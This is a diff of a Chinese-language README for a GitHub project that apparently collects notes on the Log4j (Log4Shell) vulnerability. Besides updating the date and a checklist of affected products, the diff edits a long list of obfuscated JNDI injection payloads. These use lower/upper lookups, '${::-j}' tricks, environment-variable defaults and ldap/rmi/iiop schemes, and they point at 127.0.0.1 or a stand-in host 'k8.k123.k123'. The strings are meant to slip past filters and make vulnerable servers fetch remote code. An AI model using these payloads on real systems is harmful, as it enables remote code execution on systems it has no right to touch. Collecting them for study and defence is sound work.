@@ -1,6 +1,6 @@
 # HackLog4j-永恒之恶龙
 
-本项目用来致敬全宇宙最无敌的Java日志库！同时也记录自己在学习Log4j漏洞过程中遇到的一些内容。本项目会持续更新，本项目创建于2021年12月10日，最近的一次更新时间为2021年12月19日。作者：[0e0w](https://github.com/0e0w/HackLog4j)
+本项目用来致敬全宇宙最无敌的Java日志库！同时也记录自己在学习Log4j漏洞过程中遇到的一些内容。本项目会持续更新，本项目创建于2021年12月10日，最近的一次更新时间为2021年12月20日。作者：[0e0w](https://github.com/0e0w/HackLog4j)
 
 - [01-Log4j基础知识](https://github.com/0e0w/HackLog4j#01-log4j%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86)
 - [02-Log4j框架识别](https://github.com/0e0w/HackLog4j#02-log4j%E6%A1%86%E6%9E%B6%E8%AF%86%E5%88%AB)
@@ -24,10 +24,12 @@
 
 - [ ] Apache Flink
 - [ ] Apache Struts2
+- [ ] Apache Spark
+- [ ] Apache Tomcat
 - [x] Apache Solr
+- [ ] Apache Dubbo
+- [ ] Apache Druid
 - [ ] flume
-- [ ] dubbo
-- [ ] Druid
 - [ ] Redis
 - [ ] logstash
 - [ ] ElasticSearch
@@ -35,7 +37,8 @@
 - [ ] ghidra
 - [ ] Spring-Boot-strater-log4j2
 - [ ] VMware vCenter
-- [ ] 我的世界（Minecraft）
+- [ ] Minecraft
+- [ ] Logstash
 - ......
 - https://github.com/cisagov/log4j-affected-db
 - https://github.com/YfryTchsGD/Log4jAttackSurface
@@ -67,12 +70,6 @@ ${${lower:jndi}:${lower:rmi}://127.0.0.1/poc}
 ${${lower:${lower:jndi}}:${lower:rmi}://127.0.0.1/poc}
 ${${lower:j}${lower:n}${lower:d}i:${lower:rmi}://127.0.0.1/poc}
 ${${lower:j}${upper:n}${lower:d}${upper:i}:${lower:r}m${lower:i}}://127.0.0.1/poc}
-${${::-j}${::-n}${::-d}${::-i}:${::-r}${::-m}${::-i}://127.0.0.1/poc}
-${${::-j}ndi:rmi://127.0.0.1/poc}
-${${lower:jndi}:${lower:rmi}://127.0.0.1/poc}
-${${lower:${lower:jndi}}:${lower:rmi}://127.0.0.1/poc}
-${${lower:j}${lower:n}${lower:d}i:${lower:rmi}://127.0.0.1/poc}
-${${lower:j}${upper:n}${lower:d}${upper:i}:${lower:r}m${lower:i}}://127.0.0.1/poc}
 ${jndi:${lower:l}${lower:d}${lower:a}${lower:p}}://127.0.0.1/poc}
 ${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://127.0.0.1/poc}
 $%7Bjndi:ldap://127.0.0.1/poc%7D
@@ -80,12 +77,29 @@ ${${env:ENV_NAME:-j}ndi${env:ENV_NAME:-:}${env:ENV_NAME:-l}dap${env:ENV_NAME:-:}
 ${jndi:${lower:l}${lower:d}${lower:a}${lower:p}://127.0.0.1/poc}
 ${jndi:${lower:l}${lower:d}a${lower:p}://127.0.0.1/poc}
 ${${lower:j}ndi:${lower:l}${lower:d}a${lower:p}://127.0.0.1/poc}
-${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://127.0.0.1/poc}
 ${${env:TEST:-j}ndi${env:TEST:-:}${env:TEST:-l}dap${env:TEST:-:}127.0.0.1/poc}
 ${jndi:${lower:l}${lower:d}ap://127.0.0.1/poc}
-${${::-j}${::-n}${::-d}${::-i}:${::-r}${::-m}${::-i}://127.0.0.1/poc}
 ${jndi:ldap://127.0.0.1#127.0.0.1/poc}
+${${::-j}${::-n}${::-d}${::-i}:${::-r}${::-m}${::-i}://k123.k123.k123/poc}
+${${::-j}ndi:rmi://k123.k123.k123/ass}
+${jndi:rmi://k8.k123.k123}
+${${lower:jndi}:${lower:rmi}://k8.k123.k123/poc}
+${${lower:${lower:jndi}}:${lower:rmi}://k8.k123.k123/poc}
+${${lower:j}${lower:n}${lower:d}i:${lower:rmi}://k8.k123.k123/poc}
 j${loWer:Nd}i${uPper::}
+${jndi:ldaps://127.0.0.1/poc}
+${jndi:iiop://127.0.0.1/poc}
+${date:ldap://127.0.0.1/poc}
+${java:ldap://127.0.0.1/poc}
+${marker:ldap://127.0.0.1/poc}
+${ctx:ldap://127.0.0.1/poc}
+${lower:ldap://127.0.0.1/poc}
+${upper:ldap://127.0.0.1/poc}
+${main:ldap://127.0.0.1/poc}
+${jvmrunargs:ldap://127.0.0.1/poc}
+${sys:ldap://127.0.0.1/poc}
+${env:ldap://127.0.0.1/poc}
+${log4j:ldap://127.0.0.1/poc}
 ```
 
 - https://github.com/fullhunt/log4j-scan
